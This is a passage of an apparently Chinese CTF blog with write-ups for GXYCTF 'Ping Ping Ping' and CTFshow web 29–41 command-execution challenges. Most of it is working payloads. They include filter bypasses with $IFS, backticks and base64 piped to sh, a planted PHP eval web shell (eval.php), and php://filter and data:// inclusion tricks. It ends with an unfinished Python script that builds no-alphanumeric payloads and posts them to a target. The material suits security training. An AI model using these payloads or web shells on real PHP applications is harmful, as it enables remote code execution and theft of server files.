<br></code></pre></td></tr></table></figure><p>根据上面得到的代码，我们可以知道当读取的长度大于等于800时即可绕过WAF，因此构造payload如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag=800个字符&amp;flag=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><img src="/2024/10/25/susu/Users\13061\AppData\Roaming\Typora\typora-user-images\image-20241031200724576.png" alt="image-20241031200724576"><h1 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h1><p>知识点:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">命令执行<br>linux空格绕过<br>反引号绕过       变量绕过          <span class="hljs-built_in">base64</span>编码绕过<br></code></pre></td></tr></table></figure><p>打开页面提示 “听说php可以执行系统函数？我来康康”</p><p>输入127.0.0.1</p><p>因为提示是命令执行,并且会执行ping操作,用;分隔命令,输入 </p><p>127.0.0.1;ls</p><p>发现回显了两个文件flag.php 和 index.php 也说明是linux环境,查看一下flag.php文件</p><p>输入127.0.0.1;cat flag.php 报错fxck your space!</p><p>说明是过滤了空格<br>#${IFS}  $IFS$1  %09  %20  ${IFS  &lt;重定向符号 有时候都可以替代空格 就看题目过滤了什么符号</p><p>尝试之后发现$IFS$1可以  最后的1可以是其他数字,效果是一样的</p><p>bjut.edu.cn;cat$IFS$1flag.php</p><p>回显fxck your flag! flag也被过滤了<br>那就查看一下index.php文件,发现里面是源代码</p><pre><code class="hljs">if(isset($_GET[&#39;ip&#39;]))&#123;        $ip = $_GET[&#39;ip&#39;];        if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;            print_r($match);            print($ip);            echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);            die(&quot;fxck your symbol!&quot;);        &#125;        else if(preg_match(&quot;/ /&quot;, $ip))&#123;            die(&quot;fxck your space!&quot;);        &#125;        else if(preg_match(&quot;/bash/&quot;, $ip))&#123;            die(&quot;fxck your bash!&quot;);        &#125;        else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;            #检查字符串中是否分别含有 &#39;f&#39;, &#39;l&#39;, &#39;a&#39;, &#39;g&#39; 这四个字母,无论这四个字母之间有多少或什么其他的字符,而且它们出现的顺序与 &quot;flag&quot; 字符串中的顺序相同            die(&quot;fxck your flag!&quot;);        &#125;        $a = shell_exec(&quot;ping -c 4 &quot;.$ip);        echo &quot;&quot;;        print_r($a);    &#125;</code></pre><h5 id="方法一-反引号绕过"><a href="#方法一-反引号绕过" class="headerlink" title="方法一: 反引号绕过"></a>方法一: 反引号绕过</h5><p>其中过滤了很多符号,但是没有过滤反引号&#96;&#96;</p><p>使用反引号绕过  127.0.0.1;cat$IFS$1<code>ls</code> (先执行&#96;&#96;里面的代码,绕过输入flag的限制)</p><p>然后f12查看源码得到被注释的flag</p><h5 id="方法二-变量绕过"><a href="#方法二-变量绕过" class="headerlink" title="方法二:变量绕过"></a>方法二:变量绕过</h5><p>例如a&#x3D;l;b&#x3D;s;$a$b  就会执行ls<br>输入框输入   127.0.0.1;x&#x3D;f;cat$IFS$1$xlag.php<br>这种情况会显示fuck flag,即被过滤,因为整个字符串参数ip中 f l a g 顺序出现</p><pre><code class="hljs">127.0.0.1;x=l;cat$IFS$1f$xag.php    没被过滤,但是不回显flag127.0.0.1;x=a;cat$IFS$1fl$xg.php    也是一样不回显flag127.0.0.1;x=g;cat$IFS$1fla$x.php    查看源码得到flag127.0.0.1;x=ag;cat$IFS$1fl$x.php    查看源码也可以得到flag127.0.0.1;x=lag;cat$IFS$1f$x.php    查看源码也可以得到flag</code></pre><p>这里我的理解是f$xag.php  和 fl$xg.php 不回显flag 是因为把原本的参数$x 当成了$xag 和  $xg<br>所以要把参数放在最后才会识别为$x</p><h5 id="方法三-base64编码绕过"><a href="#方法三-base64编码绕过" class="headerlink" title="方法三:base64编码绕过"></a>方法三:base64编码绕过</h5><p>这里还可以将cat flag.php进行base64编码<br>得到Y2F0IGZsYWcucGhw       再用base64-d命令来执行<br>虽然过滤了bash但大部分命令仍然可以用sh来代替执行</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS-d|sh<br></code></pre></td></tr></table></figure><p>使用 echo命令使得cat flag.php的base64编码被正确地作为输入参数传递给 base64 -d</p><p>即前面的  echo$IFS$1Y2F0IGZsYWcucGhw  作为管道符的输入</p><p>同样可以使用反引号&#96;&#96;配合base64编码绕过,这样不需要使用sh</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;`echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$<span class="hljs-number">1</span>-d`<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CTFshow web入门</title>
    <link href="/2024/10/25/ctfshowweb%E5%85%A5%E9%97%A8rce/"/>
    <url>/2024/10/25/ctfshowweb%E5%85%A5%E9%97%A8rce/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-web入门"><a href="#CTFshow-web入门" class="headerlink" title="CTFshow web入门"></a>CTFshow web入门</h1><p><img src="/2024/10/25/ctfshowweb%E5%85%A5%E9%97%A8rce/1.jpg" alt="图片"></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="web-29"><a href="#web-29" class="headerlink" title="web 29"></a>web 29</h4><p>只要提交的参数值不出现 flag 就行</p><p>先看当前目录的文件，可以看到 flag 就在当前目录下，叫 flag.php</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p>构造 payload：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat f*&#x27;</span>);   <br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat fla?.php&#x27;</span>);使用 ? 进行匹配<br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat fla\g.php&#x27;</span>);  转义绕过<br><br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls -ld&#x27;</span>);看当前目录的权限<br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;echo \&#x27;&lt;?php @eval($_REQUEST[&quot;cmd&quot;]); ?&gt;\&#x27; &gt; eval.php&#x27;</span>);看一下 <span class="hljs-keyword">eval</span>.php内容 <br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat eval.php&#x27;</span>); <br>/<span class="hljs-keyword">eval</span>.php?cmd=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);调用 这里直接调用我们自己写的木马就不用担心过滤的问题了 或者直接连接一剑<br><br><br><br>?c=echo <span class="hljs-string">`nl fl&#x27;&#x27;ag.php`</span>;在 Shell 脚本或命令行中，反引号<span class="hljs-string">` `</span> 和 $() 用于执行命令并获取其输出。nl: 这个命令会给输入的文本添加行号。它常用于格式化文本，以便于阅读和调试<br></code></pre></td></tr></table></figure><h4 id="web-30"><a href="#web-30" class="headerlink" title="web 30"></a>web 30</h4><p>echo大法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">ls</span>`;<br><br>/?c=passthru(<span class="hljs-string">&quot;cat f*&quot;</span>);<br>/?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl<span class="hljs-string">&#x27;&#x27;</span>ag.p<span class="hljs-string">&#x27;&#x27;</span>hp`;<br>/?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> f*lag.p*hp`;<br>?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">cat</span> f*`;<br></code></pre></td></tr></table></figure><h4 id="web-31"><a href="#web-31" class="headerlink" title="web 31"></a>web 31</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> 被过滤的解决方案：<br>more：一页一页的显示档案内容<br>less：与 more 类似<br><span class="hljs-built_in">head</span>：查看头几行<br><span class="hljs-built_in">tac</span>：从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是 <span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>：查看尾几行<br><span class="hljs-built_in">nl</span>：显示的时候，顺便输出行号<br><span class="hljs-built_in">od</span>：以二进制的方式读取档案内容<br>vi：一种编辑器，这个也可以查看<br>vim：一种编辑器，这个也可以查看<br><span class="hljs-built_in">sort</span>：可以查看<br><span class="hljs-built_in">uniq</span>：可以查看<br>file -f：报错出具体内容<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">经典逃逸 ?c=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);类似弄了个一句话木马 ，并且参数 <span class="hljs-number">1</span> 后面的内容不受正则匹配的影响。<br><br>    <span class="hljs-keyword">echo</span>大法       ?c=<span class="hljs-keyword">echo</span>`nl%<span class="hljs-number">09</span>fla*`;<br>              ?c=<span class="hljs-keyword">echo</span>%<span class="hljs-number">09</span>`tac%<span class="hljs-number">09</span>f*`;<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><p>scandir(pos(localeconv())): 这个函数调用 scandir() 用于扫描目录，pos(localeconv()) 返回当前本地化设置的符号。这段代码的目的是扫描某个目录下的文件和目录。</p><p>array_reverse(): 这个函数用于将数组中的元素倒序排列。在这里它被应用在 scandir() 的返回值上，意味着文件和目录列表将会以相反的顺序返回。</p><p>next(): 这个函数用于将数组的内部指针向前移动并返回当前元素的值。在这里它似乎是用于获取数组的下一个元素。</p><p>show_source(): 这个函数用于输出文件的源代码。这个代码的意图似乎是扫描某个目录下的文件和目录，然后将它们倒序排列，并尝试显示它们中的下一个文件的源代码。</p><h4 id="web-32"><a href="#web-32" class="headerlink" title="web 32"></a>web 32</h4><p>源码过滤了分号，echo，反引号，单引号，括号，分号。但没有过滤双引号。</p><p>方法1</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-encode/resource=flag.php<br> <span class="hljs-string">?&gt;</span> 是 <span class="hljs-variable constant_">PHP</span> 代码的结束标记，指示 <span class="hljs-variable constant_">PHP</span> 代码的结束，从这里开始的内容将被视为普通的 <span class="hljs-variable constant_">HTML</span> 或文本。<br>这里，也可以用<span class="hljs-variable">$_POST</span>，那么后续传参就通过post传参。<br> <span class="hljs-string">?c</span>=<span class="hljs-variable">$nice</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]<span class="hljs-string">?&gt;</span>&amp;url=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-<br>encode/resource=flag.php<br><br></code></pre></td></tr></table></figure><h4 id="web-33-34-35-36"><a href="#web-33-34-35-36" class="headerlink" title="web 33 34 35 36"></a>web 33 34 35 36</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">url + <span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[a]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-encode/resource=flag.php<br><br></code></pre></td></tr></table></figure><h4 id="web-37"><a href="#web-37" class="headerlink" title="web 37"></a>web 37</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123; <span class="hljs-comment">//过滤但有include</span><br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br>与之前基于<span class="hljs-keyword">eval</span>的命令执行不同，这里是<span class="hljs-keyword">include</span>，要传入一个文件名<br></code></pre></td></tr></table></figure><p>data协议</p><p>data协议是一种允许你在URL中嵌入数据的协议</p><p>&#x2F;?c&#x3D;data:text&#x2F;plain,<?php system("ls");?> </p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"> ?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl*&#x27;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">先对 </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat flag.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> 进行 base64 编码</span><br><span class="language-xml">再利用伪协议传输，c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br></code></pre></td></tr></table></figure><h4 id="web-38"><a href="#web-38" class="headerlink" title="web 38"></a>web 38</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br>不能是flag，php，file这些字符串并且不分大小写<br></code></pre></td></tr></table></figure><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">pay1</span><br><span class="language-xml">php 代码这里可以使用 php 短标签进行绕过，flag.php 可继续用通配符 ? 绕过</span><br><span class="language-xml"> ?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac fla?.???&#x27;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">pay2</span><br><span class="language-xml">c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br></code></pre></td></tr></table></figure><h4 id="web-39"><a href="#web-39" class="headerlink" title="web 39"></a>web 39</h4><p> 会在后面拼接一个 .php，但是过滤了 flag</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">闭合 include 函数，让拼接不执行。</span><br><span class="language-xml"> ?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl*&#x27;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml">)?&gt;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"> </span><br><span class="language-php"> 其实不用做其他处理，直接用通配符代替传参即可。</span><br><span class="language-php"> ?c=data:<span class="hljs-comment">//text/plain,&lt;?php system(&#x27;cat fl*&#x27;)?&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="web-40"><a href="#web-40" class="headerlink" title="web 40"></a>web 40</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_69289738/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">132689462</span><br></code></pre></td></tr></table></figure><p>get_defined_vars()返回的是一个多维数组，我们用current()可以获取到GET数组，用next()可以获取到POST数组，然后用array_pop()取出POST数组里面的元素，最后用eval执行</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print_r</span><span class="hljs-params">()</span></span> 函数用于打印变量，以更容易理解的形式展示<br><br><br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span>：是一个编程语言函数，返回包含本地数字及货币信息格式的数组。其中数组中的第一个为点号(.)<br><br><br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span>：返回数组中的当前元素的值。<br>这里也可以换成<span class="hljs-built_in">current</span>()，作用和pos类似<br><br><br><span class="hljs-function"><span class="hljs-title">array_reverse</span><span class="hljs-params">()</span></span>：数组逆序<br><br><br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span>：获取目录下的文件<br><br><br><span class="hljs-function"><span class="hljs-title">next</span><span class="hljs-params">()</span></span>： 函数将内部指针指向数组中的下一个元素，并输出。<br><br><br>通过 <span class="hljs-built_in">pos</span>(<span class="hljs-built_in">localeconv</span>())得到点号<br>因为<span class="hljs-built_in">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>)表示得到当前目录下的文件<br>PS：如果我没有记错，<span class="hljs-built_in">scnadir</span>(<span class="hljs-string">&#x27;/&#x27;</span>)也能扫描当前目录下面的文件，但是这道题貌似无法使用<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>)和<span class="hljs-built_in">chr</span>(<span class="hljs-number">48</span>)（.和/的ASCII码）进行过<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(current(localeconv())))));<br></code></pre></td></tr></table></figure><ol><li><code>localeconv()</code> 返回一个包含当前区域设置的数组。</li><li><code>current()</code> 获取该数组的第一个元素。</li><li><code>scandir()</code> 列出该元素指定的目录中的所有文件和子目录。</li><li><code>array_reverse()</code> 反转 <code>scandir()</code> 的结果。</li><li><code>next()</code> 移动内部指针并获取下一个文件或目录。</li><li><code>show_source()</code> 显示获取到的文件或目录的源代码。</li></ol><h4 id="web-41"><a href="#web-41" class="headerlink" title="web 41"></a>web 41</h4><p>无数字无字母，直接套用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib.parse<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_true</span>(<span class="hljs-params">reg, asc: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">return</span> reg.<span class="hljs-keyword">match</span>(<span class="hljs-built_in">chr</span>(asc)) <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">to_url_code</span>(<span class="hljs-params">asc: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;asc:02x&#125;</span>&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">char_or_dict</span>(<span class="hljs-params">reg</span>) -&gt; <span class="hljs-built_in">dict</span>:<br>    dic = &#123;&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            <span class="hljs-keyword">if</span> is_true(reg, i) <span class="hljs-keyword">and</span> is_true(reg, j):<br>                char = <span class="hljs-built_in">chr</span>(i | j)<br>                <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> dic <span class="hljs-keyword">or</span> <span class="hljs-built_in">ord</span>(char) &gt; <span class="hljs-number">126</span>:<br>                    <span class="hljs-keyword">continue</span><br>                dic[char] = [to_url_code(i), to_url_code(j)]<br>    <span class="hljs-keyword">return</span> dic<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_char_or</span>(<span class="hljs-params">char: <span class="hljs-built_in">str</span>, dic: <span class="hljs-built_in">dict</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    s1 = <span class="hljs-string">&#x27;&#x27;</span>.join(dic[i][<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> char)<br>    s2 = <span class="hljs-string">&#x27;&#x27;</span>.join(dic[i][<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> char)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;(&quot;<span class="hljs-subst">&#123;s1&#125;</span>&quot;|&quot;<span class="hljs-subst">&#123;s2&#125;</span>&quot;)&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    url = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Url: &quot;</span>)<br>    reg = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&quot;</span>, re.I)<br>    char_ordic = char_or_dict(reg)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        param = get_char_or(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;your function: &quot;</span>), char_ordic) + get_char_or(<br>            <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;your command: &quot;</span>), char_ordic<br>        )<br>        <span class="hljs-built_in">print</span>(param)<br>        <span class="hljs-built_in">print</span>(urllib.parse.unquote(param))<br>        data = &#123;<span class="hljs-string">&#x27;c&#x27;</span>: urllib.parse.unquote(param)&#125;<br>        r = requests.post(url, data=data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] result:\n<span 